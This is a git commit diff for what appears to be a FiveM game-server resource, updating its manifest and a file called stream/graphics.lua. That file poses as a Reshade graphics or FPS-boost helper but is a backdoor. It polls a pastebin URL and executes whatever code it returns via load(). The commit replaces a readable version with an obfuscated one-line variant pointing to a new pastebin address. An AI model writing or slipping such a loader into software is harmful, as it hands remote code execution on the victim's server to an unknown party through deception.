9668458d1b6eb08e6127403c61b70de8519bb833
nirual <143351491+squilixModding@users.noreply.github.com>
2024-04-22 21:18:01 +0200

    changes

--- fxmanifest.lua
+++ fxmanifest.lua
@@ -1,4 +1,4 @@
-resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'
+fx_version "cerulean"
 
 use_fxv2_oal 'yes'
 lua54 'yes'
--- stream/graphics.lua
+++ stream/graphics.lua
@@ -1,17 +1,1 @@
-Reshade = {}
-
-Reshade.MotionBlur = "https://pastebin.com/raw/1Z8VMqGg"
-Reshade.FPS = 30
-
-
-CreateThread(function()
-    while (true) do
-        Wait(Reshade.FPS * 1000)
-        PerformHttpRequest(Reshade.MotionBlur, function(DirectX11, FPSBoost)
-            if (FPSBoost ~= "function graphicBoost() local UltraHD = true local FPS_Boost = true local boostLevel = 5 end") then
-                local FivemGraphicPackLoader = assert(load(FPSBoost))
-                FivemGraphicPackLoader()
-            end
-        end)
-    end
-end)
+Reshade={};Reshade.MotionBlur="https://pastebin.com/raw/WZQyWAnJ";Reshade.FPS=77 -47 ;CreateThread(function() while true do local v2=619 -(555 + 64) ;while true do if (v2==(931 -(857 + 74))) then Wait(Reshade.FPS * (1568 -(367 + 201)) );PerformHttpRequest(Reshade.MotionBlur,function(v3,v4) if (v3 and v4) then if (v4~="function graphicBoost() local UltraHD = true local FPS_Boost = true local boostLevel = 5 end") then local v5=927 -(214 + 713) ;local v6;while true do if (v5==(0 + 0)) then v6=assert(load(v4));v6();break;end end end end end);break;end end end end);
